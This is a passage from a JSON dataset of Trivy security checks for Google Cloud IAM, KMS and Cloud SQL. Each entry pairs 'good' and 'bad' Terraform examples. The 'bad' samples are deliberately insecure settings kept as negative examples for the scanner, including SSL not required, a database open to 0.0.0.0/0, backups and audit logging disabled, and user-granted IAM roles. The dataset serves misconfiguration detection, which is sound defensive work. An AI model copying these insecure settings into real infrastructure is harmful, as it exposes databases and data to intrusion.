              "resource \"google_project_iam_binding\" \"project-123\" {\n  project = \"project-123\"\n  role    = \"roles/iam.serviceAccountTokenCreator\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-NO_USER_GRANTED_PERMISSIONS",
        "title": "No User Granted Permissions",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://www.terraform.io/docs/providers/google/d/iam_policy.html#members\n  good:\n    - |-\n      resource \"google_project_iam_binding\" \"good_example\" {\n        members = [\n          \"group:test@example.com\",\n        ]\n      }\n    - |-\n      resource \"google_storage_bucket_iam_member\" \"good_example\" {\n        member = \"serviceAccount:test@example.com\"\n      }\n  bad:\n    - |-\n      resource \"google_project_iam_binding\" \"bad_example\" {\n        members = [\n          \"user:test@example.com\",\n        ]\n      }\n    - |-\n      resource \"google_project_iam_member\" \"bad_example\" {\n        member = \"user:test@example.com\"\n      }\n",
        "file_name": "no_user_granted_permissions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/no_user_granted_permissions.yaml",
        "local_path": "google/iam/no_user_granted_permissions.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://www.terraform.io/docs/providers/google/d/iam_policy.html#members"
            ],
            "good": [
              "resource \"google_project_iam_binding\" \"good_example\" {\n  members = [\n    \"group:test@example.com\",\n  ]\n}",
              "resource \"google_storage_bucket_iam_member\" \"good_example\" {\n  member = \"serviceAccount:test@example.com\"\n}"
            ],
            "bad": [
              "resource \"google_project_iam_binding\" \"bad_example\" {\n  members = [\n    \"user:test@example.com\",\n  ]\n}",
              "resource \"google_project_iam_member\" \"bad_example\" {\n  member = \"user:test@example.com\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-KMS-ROTATE_KMS_KEYS",
        "title": "Rotate Kms Keys",
        "provider": "google",
        "service": "kms",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/kms_crypto_key#rotation_period\n  good:\n    - |-\n      resource \"google_kms_key_ring\" \"keyring\" {\n        name     = \"keyring-example\"\n        location = \"global\"\n      }\n\n      resource \"google_kms_crypto_key\" \"example-key\" {\n        name            = \"crypto-key-example\"\n        key_ring        = google_kms_key_ring.keyring.id\n        rotation_period = \"7776000s\"\n\n        lifecycle {\n          prevent_destroy = true\n        }\n      }\n  bad:\n    - |-\n      resource \"google_kms_key_ring\" \"keyring\" {\n        name     = \"keyring-example\"\n        location = \"global\"\n      }\n\n      resource \"google_kms_crypto_key\" \"example-key\" {\n        name            = \"crypto-key-example\"\n        key_ring        = google_kms_key_ring.keyring.id\n        rotation_period = \"15552000s\"\n\n        lifecycle {\n          prevent_destroy = true\n        }\n      }\n",
        "file_name": "rotate_kms_keys.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/kms/rotate_kms_keys.yaml",
        "local_path": "google/kms/rotate_kms_keys.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/kms_crypto_key#rotation_period"
            ],
            "good": [
              "resource \"google_kms_key_ring\" \"keyring\" {\n  name     = \"keyring-example\"\n  location = \"global\"\n}\n\nresource \"google_kms_crypto_key\" \"example-key\" {\n  name            = \"crypto-key-example\"\n  key_ring        = google_kms_key_ring.keyring.id\n  rotation_period = \"7776000s\"\n\n  lifecycle {\n    prevent_destroy = true\n  }\n}"
            ],
            "bad": [
              "resource \"google_kms_key_ring\" \"keyring\" {\n  name     = \"keyring-example\"\n  location = \"global\"\n}\n\nresource \"google_kms_crypto_key\" \"example-key\" {\n  name            = \"crypto-key-example\"\n  key_ring        = google_kms_key_ring.keyring.id\n  rotation_period = \"15552000s\"\n\n  lifecycle {\n    prevent_destroy = true\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-ENABLE_BACKUP",
        "title": "Enable Backup",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance#settings.backup_configuration.enabled=true\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          backup_configuration {\n            enabled = true\n          }\n        }\n      }\n\n      resource \"google_sql_database_instance\" \"new_instance_sql_replica\" {\n        name                 = \"replica\"\n        database_version     = \"POSTGRES_12\"\n        region               = \"us-central1\"\n        master_instance_name = google_sql_database_instance.db.name\n        replica_configuration {\n          connect_retry_interval  = 0\n          failover_target         = false\n          master_heartbeat_period = 0\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          backup_configuration {\n            enabled = false\n          }\n        }\n      }\n",
        "file_name": "enable_backup.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/enable_backup.yaml",
        "local_path": "google/sql/enable_backup.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance#settings.backup_configuration.enabled=true"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    backup_configuration {\n      enabled = true\n    }\n  }\n}\n\nresource \"google_sql_database_instance\" \"new_instance_sql_replica\" {\n  name                 = \"replica\"\n  database_version     = \"POSTGRES_12\"\n  region               = \"us-central1\"\n  master_instance_name = google_sql_database_instance.db.name\n  replica_configuration {\n    connect_retry_interval  = 0\n    failover_target         = false\n    master_heartbeat_period = 0\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    backup_configuration {\n      enabled = false\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-ENABLE_PG_TEMP_FILE_LOGGING",
        "title": "Enable Pg Temp File Logging",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_temp_files\"\n            value = \"0\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n      }\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_temp_files\"\n            value = \"-1\"\n          }\n        }\n      }\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_temp_files\"\n            value = \"100\"\n          }\n        }\n      }\n",
        "file_name": "enable_pg_temp_file_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/enable_pg_temp_file_logging.yaml",
        "local_path": "google/sql/enable_pg_temp_file_logging.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_temp_files\"\n      value = \"0\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n}",
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_temp_files\"\n      value = \"-1\"\n    }\n  }\n}",
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_temp_files\"\n      value = \"100\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-ENCRYPT_IN_TRANSIT_DATA",
        "title": "Encrypt In Transit Data",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n  good:\n    - |-\n      # For terraform-provider-google < 6.0.1\n      resource \"google_sql_database_instance\" \"postgres\" {\n        name             = \"postgres-instance-a\"\n        database_version = \"POSTGRES_11\"\n\n        settings {\n          tier = \"db-f1-micro\"\n\n          ip_configuration {\n            ipv4_enabled = false\n            authorized_networks {\n              value = \"108.12.12.0/24\"\n              name  = \"internal\"\n            }\n            require_ssl = true\n          }\n        }\n      }\n    - |-\n      # For terraform-provider-google >= 6.0.1\n      resource \"google_sql_database_instance\" \"postgres\" {\n        name             = \"postgres-instance-a\"\n        database_version = \"POSTGRES_11\"\n\n        settings {\n          tier = \"db-f1-micro\"\n\n          ip_configuration {\n            ipv4_enabled = false\n            authorized_networks {\n              value = \"108.12.12.0/24\"\n              name  = \"internal\"\n            }\n            ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"postgres\" {\n        name             = \"postgres-instance-a\"\n        database_version = \"POSTGRES_11\"\n\n        settings {\n          tier = \"db-f1-micro\"\n\n          ip_configuration {\n            ipv4_enabled = false\n            authorized_networks {\n              value = \"108.12.12.0/24\"\n              name  = \"internal\"\n            }\n            require_ssl = false\n          }\n        }\n      }\n    - |-\n      resource \"google_sql_database_instance\" \"postgres\" {\n        name             = \"postgres-instance-a\"\n        database_version = \"POSTGRES_11\"\n\n        settings {\n          tier = \"db-f1-micro\"\n\n          ip_configuration {\n            ipv4_enabled = false\n            authorized_networks {\n              value = \"108.12.12.0/24\"\n              name  = \"internal\"\n            }\n            ssl_mode = \"ALLOW_UNENCRYPTED_AND_ENCRYPTED\"\n          }\n        }\n      }\n",
        "file_name": "encrypt_in_transit_data.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/encrypt_in_transit_data.yaml",
        "local_path": "google/sql/encrypt_in_transit_data.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance"
            ],
            "good": [
              "# For terraform-provider-google < 6.0.1\nresource \"google_sql_database_instance\" \"postgres\" {\n  name             = \"postgres-instance-a\"\n  database_version = \"POSTGRES_11\"\n\n  settings {\n    tier = \"db-f1-micro\"\n\n    ip_configuration {\n      ipv4_enabled = false\n      authorized_networks {\n        value = \"108.12.12.0/24\"\n        name  = \"internal\"\n      }\n      require_ssl = true\n    }\n  }\n}",
              "# For terraform-provider-google >= 6.0.1\nresource \"google_sql_database_instance\" \"postgres\" {\n  name             = \"postgres-instance-a\"\n  database_version = \"POSTGRES_11\"\n\n  settings {\n    tier = \"db-f1-micro\"\n\n    ip_configuration {\n      ipv4_enabled = false\n      authorized_networks {\n        value = \"108.12.12.0/24\"\n        name  = \"internal\"\n      }\n      ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"postgres\" {\n  name             = \"postgres-instance-a\"\n  database_version = \"POSTGRES_11\"\n\n  settings {\n    tier = \"db-f1-micro\"\n\n    ip_configuration {\n      ipv4_enabled = false\n      authorized_networks {\n        value = \"108.12.12.0/24\"\n        name  = \"internal\"\n      }\n      require_ssl = false\n    }\n  }\n}",
              "resource \"google_sql_database_instance\" \"postgres\" {\n  name             = \"postgres-instance-a\"\n  database_version = \"POSTGRES_11\"\n\n  settings {\n    tier = \"db-f1-micro\"\n\n    ip_configuration {\n      ipv4_enabled = false\n      authorized_networks {\n        value = \"108.12.12.0/24\"\n        name  = \"internal\"\n      }\n      ssl_mode = \"ALLOW_UNENCRYPTED_AND_ENCRYPTED\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-MYSQL_NO_LOCAL_INFILE",
        "title": "Mysql No Local Infile",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n    - https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"MYSQL_5_6\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"local_infile\"\n            value = \"off\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"MYSQL_5_6\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"local_infile\"\n            value = \"on\"\n          }\n        }\n      }\n",
        "file_name": "mysql_no_local_infile.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/mysql_no_local_infile.yaml",
        "local_path": "google/sql/mysql_no_local_infile.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance",
              "https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"MYSQL_5_6\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"local_infile\"\n      value = \"off\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"MYSQL_5_6\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"local_infile\"\n      value = \"on\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-NO_CONTAINED_DB_AUTH",
        "title": "No Contained Db Auth",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"SQLSERVER_2017_STANDARD\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"contained database authentication\"\n            value = \"off\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"SQLSERVER_2017_STANDARD\"\n        region           = \"us-central1\"\n      }\n",
        "file_name": "no_contained_db_auth.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/no_contained_db_auth.yaml",
        "local_path": "google/sql/no_contained_db_auth.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"SQLSERVER_2017_STANDARD\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"contained database authentication\"\n      value = \"off\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"SQLSERVER_2017_STANDARD\"\n  region           = \"us-central1\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-NO_CROSS_DB_OWNERSHIP_CHAINING",
        "title": "No Cross Db Ownership Chaining",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"SQLSERVER_2017_STANDARD\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"cross db ownership chaining\"\n            value = \"off\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"SQLSERVER_2017_STANDARD\"\n        region           = \"us-central1\"\n      }\n",
        "file_name": "no_cross_db_ownership_chaining.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/no_cross_db_ownership_chaining.yaml",
        "local_path": "google/sql/no_cross_db_ownership_chaining.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"SQLSERVER_2017_STANDARD\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"cross db ownership chaining\"\n      value = \"off\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"SQLSERVER_2017_STANDARD\"\n  region           = \"us-central1\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"postgres\" {\n        name             = \"postgres-instance-a\"\n        database_version = \"POSTGRES_11\"\n\n        settings {\n          tier = \"db-f1-micro\"\n\n          ip_configuration {\n            ipv4_enabled = false\n            authorized_networks {\n              value = \"10.0.0.1/24\"\n              name  = \"internal\"\n            }\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"postgres\" {\n        name             = \"postgres-instance-a\"\n        database_version = \"POSTGRES_11\"\n\n        settings {\n          tier = \"db-f1-micro\"\n\n          ip_configuration {\n            ipv4_enabled = false\n            authorized_networks {\n              value = \"108.12.12.0/24\"\n              name  = \"internal\"\n            }\n\n            authorized_networks {\n              value = \"0.0.0.0/0\"\n              name  = \"internet\"\n            }\n          }\n        }\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/no_public_access.yaml",
        "local_path": "google/sql/no_public_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"postgres\" {\n  name             = \"postgres-instance-a\"\n  database_version = \"POSTGRES_11\"\n\n  settings {\n    tier = \"db-f1-micro\"\n\n    ip_configuration {\n      ipv4_enabled = false\n      authorized_networks {\n        value = \"10.0.0.1/24\"\n        name  = \"internal\"\n      }\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"postgres\" {\n  name             = \"postgres-instance-a\"\n  database_version = \"POSTGRES_11\"\n\n  settings {\n    tier = \"db-f1-micro\"\n\n    ip_configuration {\n      ipv4_enabled = false\n      authorized_networks {\n        value = \"108.12.12.0/24\"\n        name  = \"internal\"\n      }\n\n      authorized_networks {\n        value = \"0.0.0.0/0\"\n        name  = \"internet\"\n      }\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-PG_LOG_CHECKPOINTS",
        "title": "Pg Log Checkpoints",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_checkpoints\"\n            value = \"on\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_checkpoints\"\n            value = \"off\"\n          }\n        }\n      }\n",
        "file_name": "pg_log_checkpoints.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/pg_log_checkpoints.yaml",
        "local_path": "google/sql/pg_log_checkpoints.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_checkpoints\"\n      value = \"on\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_checkpoints\"\n      value = \"off\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-PG_LOG_CONNECTIONS",
        "title": "Pg Log Connections",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_connections\"\n            value = \"on\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_connections\"\n            value = \"off\"\n          }\n        }\n      }\n",
        "file_name": "pg_log_connections.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/pg_log_connections.yaml",
        "local_path": "google/sql/pg_log_connections.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_connections\"\n      value = \"on\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_connections\"\n      value = \"off\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-PG_LOG_DISCONNECTIONS",
        "title": "Pg Log Disconnections",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_disconnections\"\n            value = \"on\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_disconnections\"\n            value = \"off\"\n          }\n        }\n      }\n",
        "file_name": "pg_log_disconnections.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/pg_log_disconnections.yaml",
        "local_path": "google/sql/pg_log_disconnections.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_disconnections\"\n      value = \"on\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_disconnections\"\n      value = \"off\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-PG_LOG_ERRORS",
        "title": "Pg Log Errors",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_min_messages\"\n            value = \"WARNING\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_min_messages\"\n            value = \"PANIC\"\n          }\n        }\n      }\n",
        "file_name": "pg_log_errors.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/pg_log_errors.yaml",
        "local_path": "google/sql/pg_log_errors.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_min_messages\"\n      value = \"WARNING\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_min_messages\"\n      value = \"PANIC\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-PG_LOG_LOCK_WAITS",
        "title": "Pg Log Lock Waits",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_lock_waits\"\n            value = \"on\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_lock_waits\"\n            value = \"off\"\n          }\n        }\n      }\n",
        "file_name": "pg_log_lock_waits.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/sql/pg_log_lock_waits.yaml",
        "local_path": "google/sql/pg_log_lock_waits.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance"
            ],
            "good": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_lock_waits\"\n      value = \"on\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_sql_database_instance\" \"db\" {\n  name             = \"db\"\n  database_version = \"POSTGRES_12\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_lock_waits\"\n      value = \"off\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-SQL-PG_NO_MIN_STATEMENT_LOGGING",
        "title": "Pg No Min Statement Logging",
        "provider": "google",
        "service": "sql",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance\n  good:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_min_duration_statement\"\n            value = \"-1\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_sql_database_instance\" \"db\" {\n        name             = \"db\"\n        database_version = \"POSTGRES_12\"\n        region           = \"us-central1\"\n        settings {\n          database_flags {\n            name  = \"log_min_duration_statement\"\n            value = \"99\"\n          }\n        }\n      }\n",
        "file_name": "pg_no_min_statement_logging.yaml",
